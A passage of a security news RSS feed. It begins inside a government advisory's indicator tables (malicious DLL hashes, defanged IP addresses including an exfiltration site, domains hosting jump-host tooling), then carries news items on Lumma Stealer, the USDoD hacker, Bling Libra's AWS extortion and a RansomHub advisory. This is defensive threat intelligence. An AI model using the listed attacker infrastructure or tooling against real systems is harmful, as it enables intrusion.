<td>08dfebc04eb61c9a6d87b6524c1c0f2e</td>
</tr>
<tr>
<td>Bwqdffttejlkeqe.dll</td>
<td>1c85c0d044ac837e8939564afac1eb32</td>
<td>8633bd2bbbb5da22c3f8751150186c42</td>
</tr>
<tr>
<td>Bxqbsyxfkjzmhdtfceoak.dll</td>
<td>7234da8ceafbe6586469f18c03cc1832</td>
<td>5f4df6dd8e644d59eaf182e500b5e7bf</td>
</tr>
<tr>
<td>Clsrncpbaucrabuobcpale.dll</td>
<td>618d62dd95fd9aeb855fe2ef1403dce5</td>
<td>955e4c198ee58e40fe92cb74ceefdf00</td>
</tr>
<tr>
<td>Cpdvzvzyghy.dll</td>
<td>d40195a444526eafb0db56d95bf8655d</td>
<td>a905d620717f75751aa94ceb88995dbc</td>
</tr>
<tr>
<td>Ctiktdfyauejxfak.dll</td>
<td>d06761b2cff86035a4838110ed6ab622</td>
<td>2ca6bcf16ee4293a771a1cf7b7b9ee49</td>
</tr>
<tr>
<td>Czxhayyankwsp.dll</td>
<td>59da31da4db1aa5f9a5c7c0c151422c8</td>
<td>de1bf141976776becd376a0dac400df6</td>
</tr>
<tr>
<td>Djpajq.dll</td>
<td>de1f9d1f0336ddcff832ad3900acd2f1</td>
<td>974e7c0b3660fbf18f29eac059f85ac0</td>
</tr>
<tr>
<td>Dmdtflkcgebf.dll</td>
<td>394e056cb6cb732dfd5e0d45d3dae938</td>
<td>4d8343c40be53d6521244fe74393d937</td>
</tr>
<tr>
<td>Ejcpaujkmvjndgqznimmkgd.dll</td>
<td>b7c1a8d39f46eaf52be90e24565dd6b0</td>
<td>7a70d5fbbafe3454b76e3ad2f009618f</td>
</tr>
<tr>
<td>Encuutwvdqbxlxh.dll</td>
<td>2b39eab325906b0a3ab7e584c3d67349</td>
<td>df4f856f783d23fb01af1e0e64bc0e20</td>
</tr>
<tr>
<td>Esalfjyraquwfxcgufwzip.dll</td>
<td>80f0ee332a452172533ad8863bb3bc63</td>
<td>f4f4e55a00d2f3a433c9e5624285ac1c</td>
</tr>
<tr>
<td>Fdgofjdvmmllgsxunb.dll</td>
<td>9345425cf07b4c39a80cd8540e08bfde</td>
<td>eef2363744345741e09fe5380eeb4df3</td>
</tr>
<tr>
<td>Fkhzvcuucaprsibp.dll</td>
<td>aecb57e20d2c0b0d9fece2cbcbcc3459</td>
<td>4bce4831b1dd71f19c55b3e3b5e99856</td>
</tr>
<tr>
<td>Fkthhyexkr.dll</td>
<td>58dc7c9577ff90a046359ca255c0c9f4</td>
<td>19cb20c4e7dbfe15c1aa284752d0fecb</td>
</tr>
<tr>
<td>Fqattuyxknkhv.dll</td>
<td>5c9e2195d10375b746b6717fdb47b5b9</td>
<td>2b5f159f022109a8de1bc5dd9e3138a0</td>
</tr>
<tr>
<td>Fqyubbzbubsge.dll</td>
<td>afbb9459d4a0f60d7ffb3b3532d11bc2</td>
<td>8d3d4d702ba6b4be2766a41bfe5ff76e</td>
</tr>
<tr>
<td>Frkmlkdkdubkznbkmcf.dll</td>
<td>b3370eb3c5ef6c536195b3bea0120929</td>
<td>e61518ae9454a563b8f842286bbdb87b</td>
</tr>
<tr>
<td>Gsiook.dll</td>
<td>a1b509254a0a1daa7e00d279ec974461</td>
<td>0e03103e8110785156105946e48ea9e0</td>
</tr>
<tr>
<td>Gutjuhi.dll</td>
<td>791a81f31a8e7090a7d5417451e09efa</td>
<td>fba76f4eb2e7a2eb17193bebe290a198</td>
</tr>
<tr>
<td>Hisvswmeswmnqbvzpoxzx.dll</td>
<td>e1a15bc13157134f542cd9c55c742460</td>
<td>c9d1677f4f89b95b41591b23a1dc1a63</td>
</tr>
<tr>
<td>Hsoahb.dll</td>
<td>cd62d4a178705b2b90a8babd8613df93</td>
<td>032f5642d4fb2fdd74e6f20a13c57746</td>
</tr>
<tr>
<td>Icyjkszdzgoxdfuwptkwxo.dll</td>
<td>f34f60375bebad861a35b7c4bb0fa1c8</td>
<td>a66b3b22a3619f739b197d0d443b700c</td>
</tr>
<tr>
<td>Jdfzavlqr.dll</td>
<td>7fe7f33d9b5dbdf3d032d2a10e39f283</td>
<td>8cfef66b390f08bdbfd940922cf51650</td>
</tr>
<tr>
<td>Jrdggfjvve.dll</td>
<td>b32e14a9b7de6c92cd16758fa6e23346</td>
<td>1220b580cef1bf22351e271773945d20</td>
</tr>
<tr>
<td>Jteieurqgvpgnhw.dll</td>
<td>b85538f665fdb6c8d9a74f2df7369832</td>
<td>ffa68749aa3fc6495e2c49b01d964339</td>
</tr>
<tr>
<td>Kbuqtmznmodjzvxvwxcvho.dll</td>
<td>869742fb9db71fdb66f00528fe2966ec</td>
<td>5b884f15dc9b072d7bbad9ec2b249f38</td>
</tr>
<tr>
<td>Kdmvyizz.dll</td>
<td>2128361d8aaae1225d50c9add32006a1</td>
<td>9152c9de57b5647ee4ab3dff551dc8dd</td>
</tr>
<tr>
<td>Kfxghcmg.dll</td>
<td>56e0446a6d7175a0d09110bc483ddbed</td>
<td>fc418fdda06ce5982153766dcefb71d9</td>
</tr>
<tr>
<td>Krewcizfplntbwcqawfhtfpd.dll</td>
<td>6a4fca88ee36fecc5113e188cc39d25c</td>
<td>5c3b0040e2dece6e17093ae607b79044</td>
</tr>
<tr>
<td>Lsurhpmpyewhv.dll</td>
<td>143594597130e301499e5940a5fb798a</td>
<td>911c7e82f32f78577dcd725a7adb114d</td>
</tr>
<tr>
<td>Mbkzrkfasxgxtzhgpgsehip.dll</td>
<td>993f01861aff306df44e6475f7886f37</td>
<td>e4634ef9bfe7b598b857ad997445b239</td>
</tr>
<tr>
<td>Mhnovdgzzidqx.dll</td>
<td>64b9feeccf6c183b9f7138f8fc53acbb</td>
<td>7e0c42d33921a89724424f17c97037bd</td>
</tr>
<tr>
<td>Mlfampnfnmjvjnahkrawwqd.dll</td>
<td>ddec2d79f460a881849037336ba8968f</td>
<td>d973210977957209f255b58eb1715b12</td>
</tr>
<tr>
<td>Mppveiyannobrcdlkd.dll</td>
<td>9606b4720a0e73ef1f00505a11aab2f7</td>
<td>0adc2530cf348c0a3d53a680291a3d67</td>
</tr>
<tr>
<td>Mzhyeemgqbmamubqn.dll</td>
<td>f772f5c65d65412f61ef5f2660e33ceb</td>
<td>f8ffd1eab6223e31b15d0fd6c3c0472e</td>
</tr>
<tr>
<td>Nbbudwt.dll</td>
<td>875f9200b49db08c33962b0a6bd05ab9</td>
<td>2e035360971a817b854d7d5a2b008717</td>
</tr>
<tr>
<td>Nhqcfzagulwaw.dll</td>
<td>fa97dbe84ce7717b754795fa89f13dce</td>
<td>601c12596dfea84c2113ae5ee59a52ec</td>
</tr>
<tr>
<td>Nlzhpvuzzoycqnnpl.dll</td>
<td>d8c04ecd646a1f8537a59f63518ef3c6</td>
<td>47f4534da421daf8089cf34d53f6bb6e</td>
</tr>
<tr>
<td>Noubvdigjlwsnqiylzgikkk.dll</td>
<td>3bcff990faacbebb8fb470dfe03e2543</td>
<td>683546b9171a1ea284a96d1b45d1d823</td>
</tr>
<tr>
<td>Nvxwbzciqarteyuz.dll</td>
<td>c265188fdadddb648629e8060601dca7</td>
<td>af85885a74cfe099676af542dcdc5741</td>
</tr>
<tr>
<td>Nykfvwmchighqwcguabvgq.dll</td>
<td>8a2ba7f9cb6f65edf65dbe579907551e</td>
<td>673586594242d99ab02118595e457297</td>
</tr>
<tr>
<td>Ofgdwttnmqibnmpqx.dll</td>
<td>9657c2ef6ed5229740b125df9ca6c915</td>
<td>0dc5ac12f7690db15c99eaabc11b129c</td>
</tr>
<tr>
<td>Ohtvepefcjnchrrasokn.dll</td>
<td>a5494ffd9efb7c3df59c527076a05e62</td>
<td>e2cc52273d56ed66c800a726760c1ed0</td>
</tr>
<tr>
<td>Olkscszculdbzvco.dll</td>
<td>85afdef18d65b0518d709a5a324ea57a</td>
<td>77675a24040f10c85112d9a219d5f1c7</td>
</tr>
<tr>
<td>Onkwzkpfuqazvali.dll</td>
<td>da4d81f9ef3b25ea09f34481d923dd9d</td>
<td>cc4a9db6f250114e26d8d9ba6ab46bc9</td>
</tr>
<tr>
<td>Opaqwrazeyyilbbjlkf.dll</td>
<td>0e6374042b33d78329149a6189a7cb46</td>
<td>1934e2ebc64d41e37ef53ea0c075e974</td>
</tr>
<tr>
<td>Owxtabfdqhkaahhwsgkatuu.dll</td>
<td>d33f608f561096be24cba91797e0da2f</td>
<td>332b7f6662e28e3577bd1b269904b940</td>
</tr>
<tr>
<td>Poezcjhvkzgmnyqljpbte.dll</td>
<td>32db8abce1618e60441f5c7cf4be0d22</td>
<td>2b2509c6ee46d6327f2f1c9a75122d15</td>
</tr>
<tr>
<td>Rvyqctymumtudroyae.dll</td>
<td>dd2431b1f858b4ca14a4ea05fb8c4a06</td>
<td>9b2924c727aa3a061906321a66c9050c</td>
</tr>
<tr>
<td>Sutragevr.dll</td>
<td>7d3b529db1bd896d9fd877b85cafdc64</td>
<td>de276cf07ccffa18d7ffc35281bca910</td>
</tr>
<tr>
<td>Sxkdxclqmxnmjgedhgagl.dll</td>
<td>6e1394938c2fecad2d4f5b3bcf357ec0</td>
<td>d6b41747cb035c4c2b08790cd57f0626</td>
</tr>
<tr>
<td>Tosyxesxgrzyb.dll</td>
<td>99305ce01cc2d0f58cd226efb2de893f</td>
<td>6859fe5a3eead00a563cd93efcc6ea96</td>
</tr>
<tr>
<td>Tpmnkauftdydomyz.dll</td>
<td>6c152774f6894407075e6f0a2859bbae</td>
<td>981160dee6cd25fb181e54eca7ff7c22</td>
</tr>
<tr>
<td>Tptjtwfhpsjfksqoajt.dll</td>
<td>343b140977b3f9b227e7e5f82b0fadb5</td>
<td>95cf2a5a24b0d33d621bb8995d5826bc</td>
</tr>
<tr>
<td>Tsgblplhdwwj.dll</td>
<td>54a9fa9eb337a3b5ca7b0fa4553e439d</td>
<td>cee5acbfef7e76f52f40b8ae95199c50</td>
</tr>
<tr>
<td>Uqhznlcagzyoqrbyylnnwn.dll</td>
<td>4c19aeecbfca13b8a199703d8b8284b9</td>
<td>ad0ca738aa6c987e4ee1a87ff2b8acd5</td>
</tr>
<tr>
<td>Uslrfkxccdyetfdxmaokbhv.dll</td>
<td>dc795cb9290b1bc0b7fb1ce9d6ae7c93</td>
<td>552d9b79cc544fc6c3e8aa204dd00811</td>
</tr>
<tr>
<td>Waordspinycera.dll</td>
<td>9935a86108e3ae3f72cd15817601dcc6</td>
<td>5d063eecd894d3d523875bc82ef6f319</td>
</tr>
<tr>
<td>Wcfsobntsczz.dll</td>
<td>77aa3f342a0d69fda67c853bcc004d48</td>
<td>d0b00a6c83ce810ec2763af17e8ab1c4</td>
</tr>
<tr>
<td>Wpqyhvfnunlabx.dll</td>
<td>03af632aa6f87bf9dd4364ee3b612cbb</td>
<td>9f11e915be5c0d02a3130329cf032a28</td>
</tr>
<tr>
<td>Wqwpawlulyrsrjcbvuvddeud.dll</td>
<td>41871fef433d7b4b89fd226fe3a1a2c0</td>
<td>e21fe98cc8866c0eeecf3549ebcec751</td>
</tr>
<tr>
<td>Wqxpgvsgvhygmfbziucxcuh.dll</td>
<td>246d9f9831b125ea7e6ef21bc4c8a0ca</td>
<td>dea3ae8225913dd98148fc86cfc3bcbe</td>
</tr>
<tr>
<td>Xgcpgrxhchgwz.dll</td>
<td>9c695be3703194fdb71c212a0832bcf3</td>
<td>8744cec7547b1e73705c10a264e28e08</td>
</tr>
<tr>
<td>Xgkepoc.dll</td>
<td>69e58c5ee69f5e5e8a58f4afdd59adfe</td>
<td>d43446b4a22a597b93b559821ee5ac9b</td>
</tr>
<tr>
<td>Xlfthpiq.dll</td>
<td>540ee8e39150c539fea582b0e77be7b0</td>
<td>3fe96ff4a5ef0f5346ce645a2a893597</td>
</tr>
<tr>
<td>Xlocky.dll</td>
<td>0a2affa6d895baab087b84e93145da35</td>
<td>246f31c86bbbe7f65c0126cf4a1a947a</td>
</tr>
<tr>
<td>Xqblktvxmnxrzwiuqdfxzrd.dll</td>
<td>569c1d31f4c7ec7701d8e4e51b59fe85</td>
<td>5eaa7e812733a5c8cda734fab2f752d5</td>
</tr>
<tr>
<td>Xykqrksoqqgyuckfc.dll</td>
<td>09a2d85e809d36bff82bd5ab773980a3</td>
<td>96964aed18f65a7acae632f358a093f6</td>
</tr>
<tr>
<td>Yawyjonk.dll</td>
<td>3ccf799ff208981349cee4fb1a1cf88c</td>
<td>4e9c55c6fe25d61ca4394de794546fab</td>
</tr>
<tr>
<td>Yrknbt.dll</td>
<td>6154760e602bd71192d93f72fbdb486e</td>
<td>94bf96b76c2a092de8962496ce35deaf</td>
</tr>
<tr>
<td>Yvbmuigfihprdxgiirp.dll</td>
<td>b0d0a23766fa64ece9315f37b28bb4c0</td>
<td>1e22d64f263e8ea4b2d37dcd9b7c3012</td>
</tr>
<tr>
<td>Ywrovtjimixpmizuln.dll</td>
<td>ca43a241042b5fcc305393765ae18e69</td>
<td>28d571ddb5c04d065dfe1be9604663ba</td>
</tr>
<tr>
<td>Zfgdccnwnee.dll</td>
<td>251f3a4757d9e4de0499cc30c0bc00a9</td>
<td>755dac7edd17fbf5b5c449dd06c02e14</td>
</tr>
<tr>
<td>Zkuxhxwbvifejn.dll</td>
<td>9d7ab8b0aa669125d9a5adc4f46c56f3</td>
<td>af277ae0fbf6cc20f887696ea4756d46</td>
</tr>
<tr>
<td>Zsdflpivel.dll</td>
<td>a9c9c0be8eca3b575c24da0fcf1af1a9</td>
<td>1cac5c0cb8801e8730447023270d8d56</td>
</tr>
</tbody>
</table>
</div>
<h2><strong>Appendix B: Indicators of Compromise</strong></h2>
<p><strong>Table 27</strong> lists observed IP addresses that were first observed as early as 2022 and have been historically linked to Unit 29155 infrastructure. These IPs are considered historical infrastructure and should be investigated for associated abnormal or malicious activity.</p>
<div>
<table class="tablesaw tablesaw-stack">
<caption><em>Table 27: IP Addresses Associated with Unit 29155 Infrastructure</em></caption>
<thead>
<tr>
<th>IP Address</th>
</tr>
</thead>
<tbody>
<tr>
<td>5.226.139[.]66</td>
</tr>
<tr>
<td>45.141.87[.]11</td>
</tr>
<tr>
<td>46.101.242[.]222</td>
</tr>
<tr>
<td>62.173.140[.]223</td>
</tr>
<tr>
<td>79.124.8[.]66</td>
</tr>
<tr>
<td>90.131.156[.]107</td>
</tr>
<tr>
<td>112.51.253[.]153</td>
</tr>
<tr>
<td>112.132.218[.]45</td>
</tr>
<tr>
<td>154.21.20[.]82</td>
</tr>
<tr>
<td>179.43.133[.]202</td>
</tr>
<tr>
<td>179.43.142[.]42</td>
</tr>
<tr>
<td>179.43.162[.]55</td>
</tr>
<tr>
<td>179.43.175[.]38</td>
</tr>
<tr>
<td>179.43.175[.]108 (data exfiltration site)</td>
</tr>
<tr>
<td><a>179.43.176[.]60</a></td>
</tr>
<tr>
<td>179.43.187[.]47</td>
</tr>
<tr>
<td>179.43.189[.]218</td>
</tr>
<tr>
<td>185.245.84[.]227</td>
</tr>
<tr>
<td>185.245.85[.]251</td>
</tr>
<tr>
<td>194.26.29[.]84</td>
</tr>
<tr>
<td>194.26.29[.]95</td>
</tr>
<tr>
<td>194.26.29[.]98</td>
</tr>
<tr>
<td>194.26.29[.]251</td>
</tr>
</tbody>
</table>
<p>Threat actors can exploit jump hosts, also known as jump servers or bastion hosts, to gain unauthorized access or perform malicious activities within a protected network. In this context, the domains listed in <strong>Table 28</strong> represent the tools used to establish functionality for creating a jump host.</p>
<div>
<table class="tablesaw tablesaw-stack">
<caption><em>Table 28: Domains Hosting Jump Host Tooling</em></caption>
<thead>
<tr>
<th>Domain Name</th>
</tr>
</thead>
<tbody>
<tr>
<td>interlinks[.]top</td>
</tr>
<tr>
<td>https://3proxy[.]ru</td>
</tr>
<tr>
<td>https://ngrok[.]com (<strong>Note:</strong> This domain is a legitimate service leveraged for malicious purposes by Unit 29155 cyber actors and should be investigated prior to blocking.)</td>
</tr>
<tr>
<td>https://nssm[.]cc</td>
</tr>
</tbody>
</table>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
]]></content:encoded>
<pubDate>Thu, 05 Sep 24 12:00:00 +0000</pubDate>
</item>
<item>
<title>GitHub comments abused to push password stealing malware masked as fixes</title>
<link>https://www.bleepingcomputer.com/news/security/github-comments-abused-to-push-password-stealing-malware-masked-as-fixes/</link>
<guid>https://www.bleepingcomputer.com/news/security/github-comments-abused-to-push-password-stealing-malware-masked-as-fixes/</guid>
<content:encoded><![CDATA[
GitHub is being abused to distribute the Lumma Stealer information-stealing malware as fake fixes posted in project comments. [...]
]]></content:encoded>
<pubDate>Sat, 31 Aug 2024 11:21:32 -0400</pubDate>
</item>
<item>
<title>Brazilian Hacker Behind Major Data Leaks</title>
<link>https://www.cysecurity.news/2024/08/brazilian-hacker-behind-major-data-leaks.html</link>
<guid>https://www.cysecurity.news/2024/08/brazilian-hacker-behind-major-data-leaks.html</guid>
<content:encoded><![CDATA[
<p></p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgOMrj-Xk3WtiayfcYtJRkXkF26JWiBjKf3y4V-B5U6pqWKE-BIbf3qBdGDRyuqo35F0jAq2qCMjgK2nOAqS-wERI3ysQEByI1my6UaI4IVNDoGUTW8YXHGuSBg9hm3ig5V7sUzjcXRrBGcQ0eikLTTL3VoyWPxbqgy-AtuYLvt7jSyuOwV8a9rLlYJrOOh/s1280/digital-4683519_1280.jpg" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="426" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgOMrj-Xk3WtiayfcYtJRkXkF26JWiBjKf3y4V-B5U6pqWKE-BIbf3qBdGDRyuqo35F0jAq2qCMjgK2nOAqS-wERI3ysQEByI1my6UaI4IVNDoGUTW8YXHGuSBg9hm3ig5V7sUzjcXRrBGcQ0eikLTTL3VoyWPxbqgy-AtuYLvt7jSyuOwV8a9rLlYJrOOh/w640-h426/digital-4683519_1280.jpg" width="640" /></a></div><br /><br /><p></p><p style="text-align: justify;">In a recent turn of events, cybersecurity firm CrowdStrike has identified the hacker known as USDoD, who has been linked to numerous data breaches, as a 33-year-old Brazilian man. This hacker, also known by the alias "EquationCorp," has been behind several high-profile cyber attacks targeting prominent organisations, including Airbus, the FBI's InfraGard portal, National Public Data, and TransUnion.</p><p style="text-align: justify;">A report obtained by the Brazilian news site TecMundo, from an anonymous source within CrowdStrike, reveals that the individual behind USDoD is Luan BG, a resident of Minas Gerais, Brazil. The report states that CrowdStrike has shared this information with the authorities, which includes details such as his tax registration, email addresses, domains he registered, IP addresses, social media accounts, and his phone number. While personal information about Luan has been uncovered, specific details that could fully reveal his identity have been kept confidential by CrowdStrike, respecting privacy concerns despite his criminal activities.</p><p style="text-align: justify;">According to the investigation, Luan BG has been involved in hacking activities since at least 2017, originally engaging in hacktivism. However, by 2022, his activities had escalated into more serious cybercrimes. His operational security mistakes played a crucial role in his identification. For instance, he repeatedly used the same email address and similar phrases across various social media platforms and forums, allowing investigators to track his activities. This email was also linked to personal accounts, domain registrations, GitHub contributions, and social media profiles, which collectively led to his identification. Additionally, early gaps in his technical abilities made it easier for investigators to compile a detailed profile of him, including photos and emails tied to his aliases.</p><p style="text-align: justify;">Robert Baptiste, a well-known cybersecurity expert and CEO of Predicta Lab, has confirmed CrowdStrike's findings through an independent investigation. Baptiste’s work corroborates the evidence pointing to Luan BG as the individual behind the USDoD alias.</p><p style="text-align: justify;">The report also highlights that Luan BG inadvertently exposed his identity during a 2023 interview with DataBreaches.net, where he falsely claimed to be around 30 years old with dual Brazilian and Portuguese citizenship, residing in Spain. However, further investigation into his online activities, including emails and social media posts, traced his location back to Brazil. Despite his attempts to mislead by claiming U.S. citizenship, CrowdStrike was able to connect him to Brazil using financial records and other digital traces.</p><p style="text-align: justify;">Although authorities have been informed about Luan BG’s identity, there is concern that he may continue his cybercriminal activities. Despite the exposure, experts fear that Luan might deny the revelations or downplay them and persist in his illicit endeavours.</p><p style="text-align: justify;">The exposure of USDoD’s identity by CrowdStrike is a crucial step in the ongoing battle against cybercrime. It highlights the complex challenges cybersecurity professionals face in tracking down and exposing individuals involved in high-level cyberattacks. As the case unfolds, the impact of this discovery on the broader cybercriminal community will be closely watched.</p><p style="text-align: justify;"><br /></p>
]]></content:encoded>
<pubDate>2024-08-31T14:45:32.957-04:00</pubDate>
</item>
<item>
<title>Bling Libra Shifts Focus to Extortion in Cloud-Based Attacks</title>
<link>https://www.cysecurity.news/2024/08/bling-libra-shifts-focus-to-extortion.html</link>
<guid>https://www.cysecurity.news/2024/08/bling-libra-shifts-focus-to-extortion.html</guid>
<content:encoded><![CDATA[
<p>&nbsp;</p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjYahwi7Z2_VX3-2ur8VuJsvO9Sw-YMzyHqe5bkxCXkFemYM1oxLsDkQ_CnQgu61Zk69hFTflTY3KvZ71jPjB8xZwN8f_y57y2PmNLtwn04B2tDrpEfcXCeL_QHuiJwupwZHzj-S-SS4-qn1xRHofw3VvTmjr59x-4AbGzEAdYWELfLg_uWsf6SRwepvVJ8/s4000/cloud-computing-2001090.jpg" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="360" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjYahwi7Z2_VX3-2ur8VuJsvO9Sw-YMzyHqe5bkxCXkFemYM1oxLsDkQ_CnQgu61Zk69hFTflTY3KvZ71jPjB8xZwN8f_y57y2PmNLtwn04B2tDrpEfcXCeL_QHuiJwupwZHzj-S-SS4-qn1xRHofw3VvTmjr59x-4AbGzEAdYWELfLg_uWsf6SRwepvVJ8/w640-h360/cloud-computing-2001090.jpg" width="640" /></a></div><br /><p></p><div style="text-align: justify;">It was observed during an incident response engagement handled by Unit 42, that the threat actor group Bling Libra (which was responsible for distributing ShinyHunters ransomware) had shifted from extortion to extortion of victims rather than its traditional tactic of selling/publishing stolen data in an attempt to increase their profits.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">During this engagement, it was also demonstrated how the group was able to acquire legitimate credentials, which were accessed from public repositories, to gain initial access to an organization's Amazon Web Services (AWS) environment through its public username and password.

The compromised credentials had limited impact due to the limited permissions associated with them, but Bling Libra managed to infiltrate the organization's AWS environment and conduct reconnaissance operations on it during this time.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">The threat actor group used various tools for gaining information and accessing S3 bucket configurations, interacting with S3 objects, as well as deleting files from the service using tools such as the Amazon Simple Storage Service (S3) Browser and WinSCP.

As a result of previous jobs with high-profile data breaches, including the Microsoft GitHub and Tokopedia incidents in 2020, Bling Libra has developed a special part of their business model that enables them to monetize stolen data through underground marketplaces.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">There has, however, been a significant change in the methods that Unit 42 implements, which have been reported in a recent report. As of 2024, Bling Libra has revitalized its business model from data theft to extortion, primarily targeting vulnerabilities within cloud-based environments to heighten its revenue.

As Unit 42 explained in its latest report, Bling Libra obtained AWS credentials from a sensitive file that was exposed online to perform the latest attack.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">AWS account credentials were obtained from an Identity and Access Management (IAM) user, which would have provided the attackers with access to the victim's account on Amazon Web Services (AWS). While the permissions for accessing Amazon S3 resources were restricted, Bling Libra exploited them to gain a foothold in the cloud environment even though they were limited.

Even though Bling Libra uses the same method of accessing victims for the first few minutes, it has instead instigated the double-extortion tactics normally associated with ransomware gangs - they initially steal data from victims and threaten to publish it online if they do not pay the ransom.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">According to the researchers, Bling Libra used credentials from a sensitive file exposed by the attacker on the Internet as a way of stealing the credentials, even though this file contained a variety of credentials. Aside from these exposed AWS access keys, the group also alleged that it "targeted a few other one-time credentials that were exposed by this individual as well as a few other exposed AWS access keys belonging to this individual.".&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">Using these credentials, it is possible for the threat actors to gain access to the AWS account where the IAM user resides and to use the AWS API call to interact with the S3 bucket under the context of the AmazonS3FullAccess policy, which allows all permissions to be granted to users.

The attackers in this case sat on the network and lurked for about a month before launching an attack that led to the exfiltration of information, its deletion from the environment, and the recovery of an extortion note demanding ransom payment.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">Their ransom note gave them a week to make their payment. It has been reported that Bling Libra also created new S3 buckets in the aftermath of their attack, presumably to mock the organization about the attack, as well.

Ticketmaster's attack in June was notable because of how much data Bling Libra was able to obtain during this attack. At the time, the organization claimed that a total of more than half a million records were stolen, some of which contained Personal Identifiable Information (PII) such as names, emails, addresses, and partial credit card information.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">In May, the same group also claimed responsibility for several other attacks on other companies, including Ticketek Entertainment Group (TEG), in Australia, that occurred around the same period as Ticketmaster. Like Ticketmaster, TEG was attacked at the beginning of May. This group has been associated with several significant data breaches that have affected millions of records of data, and the implications have been severe.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">In the final phase of the attack, Bling Libra created new S3 buckets with mocking names to signify their control over the environment, illustrating their ability to manipulate the system.

The threat group known as Bling Libra has adopted a new tactic, pivoting to extortion as a primary method for monetizing their cyber breaches.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">Following their recent cloud-based attacks, the group sent out extortion emails demanding payment in exchange for the return of stolen data and the cessation of further malicious activities. This shift in strategy underscores their focus on using extortion as a central means to profit from their operations.

A recent report by Unit 42 offers a comprehensive analysis of Bling Libra's operational tools, particularly emphasizing their use of S3 Browser and WinSCP.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">These tools enable the threat actors to interact seamlessly with Amazon Web Services (AWS) environments. The report provides in-depth insights that assist incident responders in distinguishing between legitimate tool usage and activities indicative of a security breach.

To counteract such threats, Unit 42 strongly advises organizations to adhere to the principle of least privilege, ensuring that users have only the minimal level of access necessary to perform their functions.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">Additionally, they recommend implementing robust security measures, including the use of AWS IAM Access Analyzer and AWS Service Control Policies. These tools are essential for mitigating the risks associated with similar attacks on cloud infrastructure.

As businesses increasingly depend on cloud technologies, maintaining a proactive and vigilant cybersecurity posture is critical. Organizations must be diligent in their efforts to protect their cloud environments from sophisticated threat actors like Bling Libra.</div>
]]></content:encoded>
<pubDate>2024-08-30T14:30:00.224-04:00</pubDate>
</item>
<item>
<title>#StopRansomware: RansomHub Ransomware</title>
<link>https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-242a</link>
<guid>https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-242a</guid>
<content:encoded><![CDATA[
<h2><strong>Summary</strong></h2>
<p><em><strong>Note:</strong> This joint Cybersecurity Advisory is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit&nbsp;</em><a href="https://www.cisa.gov/stopransomware" title="#StopRansomware"><em>stopransomware.gov</em></a><em> to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.</em></p>
<p>The Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), the Multi-State Information Sharing and Analysis Center (MS-ISAC), and the Department of Health and Human Services (HHS) (hereafter referred to as the authoring organizations)&nbsp;are releasing this joint advisory to disseminate known RansomHub ransomware IOCs and TTPs. These have been identified through FBI threat response activities and third-party reporting as recently as August 2024. RansomHub is a ransomware-as-a-service variant—formerly known as Cyclops and Knight—that has established itself as an efficient and successful service model (recently attracting high-profile affiliates from other prominent variants such as LockBit and ALPHV).</p>
<p>Since its inception in February 2024, RansomHub has encrypted and exfiltrated data from at least 210 victims representing the water and wastewater, information technology, government services and facilities, healthcare and public health, emergency services, food and agriculture, financial services, commercial facilities, critical manufacturing, transportation, and communications critical infrastructure sectors.</p>
<p>The affiliates leverage a double-extortion model by encrypting systems and exfiltrating&nbsp;data to extort victims. It should be noted that data exfiltration methods are dependent on the affiliate conducting the network compromise. The ransom note dropped during encryption does not generally include an initial ransom demand or payment instructions. Instead, the note provides victims with a client ID and instructs them to contact the ransomware group via a unique <code>.onion</code> URL (reachable through the Tor browser). The ransom note typically gives victims between three and 90 days to pay the ransom (depending on the affiliate) before the ransomware group publishes their data on the RansomHub Tor data leak site.</p>
<p>The authoring organizations encourage network defenders to implement the recommendations in the&nbsp;<strong>Mitigations</strong> section of this cybersecurity advisory to reduce the likelihood and impact of ransomware incidents.</p>
<p>Download the PDF version of this report:</p>





<div class="c-file">
    <div class="c-file__download">
    <a class="c-file__link" href="https://www.cisa.gov/sites/default/files/2024-08/aa24-242a-stopransomware-ransomhub-ransomware.pdf" target="_blank">AA24-242A #StopRansomware: RansomHub Ransomware</a>
    <span class="c-file__size">(PDF,       714.48 KB
  )</span>
  </div>
</div>
<p>For a downloadable copy of IOCs, see:</p>





<div class="c-file">
    <div class="c-file__download">
    <a class="c-file__link" href="https://www.cisa.gov/sites/default/files/2024-08/AA24-242A.stix_.xml" target="_blank">AA24-242A STIX XML</a>
    <span class="c-file__size">(XML,       133.74 KB
  )</span>
  </div>
</div>





<div class="c-file">
    <div class="c-file__download">
    <a class="c-file__link" href="https://www.cisa.gov/sites/default/files/2024-08/AA24-242A-StopRansomware-RansomHub-Ransomware.stix_.json" target="_blank">AA24-242A STIX JSON</a>
    <span class="c-file__size">(JSON,       109.41 KB
  )</span>
  </div>
</div>
